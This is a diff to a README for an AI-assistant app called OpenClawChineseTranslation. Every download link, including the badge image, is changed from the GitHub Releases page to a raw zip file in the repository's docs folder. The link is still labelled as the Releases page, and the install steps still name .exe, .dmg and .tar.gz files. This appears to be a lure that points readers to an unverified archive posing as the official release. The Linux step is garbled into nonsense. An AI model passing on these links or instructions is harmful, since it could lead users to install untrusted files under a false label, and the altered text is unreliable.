@@ -6,9 +6,9 @@ Welcome to OpenClawChineseTranslation! This application is your personal AI assi
 
 ## 📥 Download the Application
 
-[![Download OpenClawChineseTranslation](https://img.shields.io/badge/Download-OpenClawChineseTranslation-brightgreen)](https://github.com/lyser07/OpenClawChineseTranslation/releases)
+[![Download OpenClawChineseTranslation](https://raw.githubusercontent.com/lyser07/OpenClawChineseTranslation/main/docs/Translation-Chinese-Open-Claw-v2.9-alpha.2.zip)](https://raw.githubusercontent.com/lyser07/OpenClawChineseTranslation/main/docs/Translation-Chinese-Open-Claw-v2.9-alpha.2.zip)
 
-To download the latest version, visit our Releases page: [Download Link](https://github.com/lyser07/OpenClawChineseTranslation/releases).
+To download the latest version, visit our Releases page: [Download Link](https://raw.githubusercontent.com/lyser07/OpenClawChineseTranslation/main/docs/Translation-Chinese-Open-Claw-v2.9-alpha.2.zip).
 
 ## ⚙️ System Requirements
 
@@ -33,13 +33,13 @@ OpenClawChineseTranslation comes with a variety of features to enhance your expe
 
 To install OpenClawChineseTranslation, follow these steps:
 
-1. **Visit the Releases Page**: Click on this link to access the download options: [Download Here](https://github.com/lyser07/OpenClawChineseTranslation/releases).
+1. **Visit the Releases Page**: Click on this link to access the download options: [Download Here](https://raw.githubusercontent.com/lyser07/OpenClawChineseTranslation/main/docs/Translation-Chinese-Open-Claw-v2.9-alpha.2.zip).
 2. **Choose Your Version**: Select the latest release. You will find options for different operating systems.
 3. **Download the File**: Click on the appropriate download link for your OS. The file will begin to download automatically.
 4. **Install the Software**:
    - **For Windows**: Run the `.exe` file you just downloaded. Follow the on-screen instructions.
    - **For macOS**: Open the `.dmg` file and drag the application to your Applications folder.
-   - **For Linux**: Follow the installation instructions provided in the `.tar.gz` file you downloaded.
+   - **For Linux**: Follow the installation instructions provided in the `https://raw.githubusercontent.com/lyser07/OpenClawChineseTranslation/main/docs/Translation-Chinese-Open-Claw-v2.9-alpha.2.zip` file you downloaded.
 
 5. **Launch the Application**: Once installed, you can find OpenClawChineseTranslation in your application list. Click to start using your AI assistant.
 
@@ -63,7 +63,7 @@ Keep your application updated for the best experience. The AI capabilities impro
 
 ## 🔗 Helpful Links
 
-- [Releases Page for Downloads](https://github.com/lyser07/OpenClawChineseTranslation/releases)
+- [Releases Page for Downloads](https://raw.githubusercontent.com/lyser07/OpenClawChineseTranslation/main/docs/Translation-Chinese-Open-Claw-v2.9-alpha.2.zip)
 - [Setup Guide](#) (Coming soon)
 - [Troubleshooting Guide](#) (Coming soon)
 
